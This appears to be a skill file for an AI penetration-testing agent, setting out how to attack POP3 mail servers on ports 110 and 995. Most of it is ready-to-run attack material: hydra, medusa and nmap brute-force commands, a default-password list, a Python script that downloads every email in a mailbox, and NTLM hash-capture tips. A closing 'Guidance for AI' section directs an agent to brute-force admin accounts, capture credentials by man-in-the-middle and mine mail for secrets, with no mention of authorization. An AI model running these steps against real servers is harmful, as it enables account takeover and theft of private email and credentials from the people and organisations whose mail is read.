# POP3 Pentesting Skill

## Goal

Identify and exploit vulnerabilities in POP3 email services on port 110/995.

## Port

- **110** - POP3 (plaintext)
- **995** - POP3S (SSL/TLS)

## Methodology

1. **Identify POP3 Service:** Scan for ports 110 and 995
2. **Enumerate Users:** Test for valid usernames
3. **Brute Force:** Attack weak credentials
4. **Read Emails:** Download and analyze mailbox contents
5. **Extract Data:** Find sensitive information in emails

## Enumeration

```bash
# Nmap scan
nmap -sV -p 110,995 <target>

# Banner grabbing
nc <target> 110
telnet <target> 110

# Check capabilities
nmap -p 110 --script pop3-capabilities <target>
```

## POP3 Commands

```bash
# Connect
nc <target> 110

# Authenticate
USER <username>
PASS <password>

# List emails
LIST      # List all emails with sizes
STAT      # Get mailbox statistics (count, size)

# Retrieve emails
RETR 1    # Retrieve email 1
TOP 1 10  # Retrieve headers + first 10 lines of email 1

# Delete email
DELE 1    # Mark email 1 for deletion
QUIT      # Commit deletions
```

## User Enumeration

```bash
# VRFY/EXPN (if supported)
VRFY <username>

# USER timing attack
# Note: Some servers respond differently for valid/invalid users

# Using nmap
nmap -p 110 --script pop3-brute <target>
```

## Brute Force

```bash
# Using hydra
hydra -l admin -P passwords.txt pop3://<target>
hydra -L users.txt -P passwords.txt pop3s://<target>:995

# Using nmap
nmap -p 110 --script pop3-brute --script-args userdb=users.txt,passdb=passes.txt <target>

# Medusa
medusa -h <target> -U users.txt -P passes.txt -M pop3
```

## Email Extraction

```python
# Python script to download all emails
import poplib

server = poplib.POP3('<target>')
server.user('<username>')
server.pass_('<password>')

num_messages = len(server.list()[1])
for i in range(1, num_messages + 1):
    print(server.retr(i))
```

## NTLM Hash Capture

```bash
# If server supports NTLM auth
# Use Responder or similar to capture hashes

# Check for NTLM
nmap -p 110 --script pop3-ntlm-info <target>
```

## Common Credentials

```
admin/admin
admin/password
mail/mail
user/user
test/test
<domain_user>/<common_passwords>
```

## Sensitive Data in Emails

```bash
# Look for:
- Password reset links
- API keys
- Internal URLs
- Credentials
- Confidential documents
- 2FA backup codes
```

## Tools

* **Telnet/Netcat** - Manual interaction
* **Hydra** - Brute force
* **Nmap** - Enumeration and scripts
* **Python poplib** - Programmatic access

## Guidance for AI

* Activate when port 110 or 995 is open
* POP3 is clear-text; capture credentials with MitM
* Brute force common accounts (admin, postmaster)
* Downloaded emails may contain sensitive information
* Check for NTLM authentication for hash capture
* POP3 typically downloads and deletes emails (unlike IMAP)
